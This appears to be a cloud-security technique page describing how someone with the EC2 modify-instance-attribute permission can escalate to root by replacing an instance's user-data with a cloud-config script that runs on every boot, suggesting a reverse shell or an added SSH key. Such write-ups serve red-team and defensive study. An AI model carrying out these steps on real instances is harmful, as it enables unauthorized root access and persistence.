---
author_name: Nick Frichette
title: "Local Privilege Escalation: User Data"
description: Escalate privileges on an EC2 instance by modifying the user-data scripts with modify-instance-attribute.
hide:
  - toc
---

# Local Privilege Escalation: User Data

**Required IAM Permission**: [modify-instance-attribute](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/modify-instance-attribute.html)  
**Recommended but not required**: [start-instances](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/start-instances.html), [describe-instances](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-instances.html), [stop-instances](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/stop-instances.html) (makes things go faster, requires less enumeration. The instance must be stopped to alter the user data)  

If an adversary has access to the modify-instance attribute permission they can leverage it to escalate to root/System on an EC2 instance.

Usually, user data scripts are only run the first time the instance is started, however this can be changed using [cloud-init](https://aws.amazon.com/premiumsupport/knowledge-center/execute-user-data-ec2/) to run every time the instance restarts.

To do this, first create a file in the following format.

```
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
**commands here**
--//
```

Modify the ```commands here``` section to do whatever action you want. Setting a reverse shell, adding an ssh key to the default user, etc. are all good options.

Once you've done that, convert the file to base64. Linux can do this with the following command.

```base64 file.txt > file.b64.txt```

Windows can do this with the following command.

```certutil -encode file.txt tmp.b64 && findstr /v /c:- tmp.b64 > file.b64.txt```

Now that you've base64 encoded your payload, you will leverage the modify-instance-attribute API call to change the user data of the target instance. Note: the instance will need to be stopped to modify its user data. You'll either have to stop it yourself, or wait for something else to stop it.

```
aws ec2 modify-instance-attribute \
--instance-id=xxx \
--attribute userData \
--value file://file.b64.txt
```

With that change made, simply start the instance again and your command will be executed with root/System.